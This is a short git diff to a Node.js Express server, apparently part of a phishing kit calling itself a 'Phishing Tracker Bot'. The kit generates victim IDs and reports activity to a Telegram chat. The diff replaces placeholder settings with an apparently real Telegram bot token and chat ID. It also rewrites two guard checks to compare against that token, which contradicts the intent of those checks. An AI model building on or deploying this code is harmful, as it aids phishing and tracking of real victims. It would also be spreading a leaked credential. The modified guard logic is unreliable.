@@ -7,8 +7,8 @@ const crypto = require('crypto');
 const app = express();
 
 // Konfigurasi
-const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
-const TELEGRAM_CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE';
+const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN || '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s';
+const TELEGRAM_CHAT_ID = process.env.CHAT_ID || '6834832649';
 const PORT = process.env.PORT || 3000;
 const DOMAIN = process.env.DOMAIN || `http://localhost:${PORT}`;
 
@@ -1301,7 +1301,7 @@ function generateVictimId(req) {
 }
 
 // Bot commands handler
-if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
     bot.onText(/\/start/, (msg) => {
         bot.sendMessage(msg.chat.id, `
 🕵️ *Phishing Tracker Bot* 🕵️
@@ -1391,7 +1391,7 @@ app.listen(PORT, () => {
     `);
     
     // Send startup message to Telegram
-    if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+    if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
         bot.sendMessage(TELEGRAM_CHAT_ID, 
             `✅ *Phishing Tracker Started*\n\n` +
             `🌐 Server: ${DOMAIN}\n` +
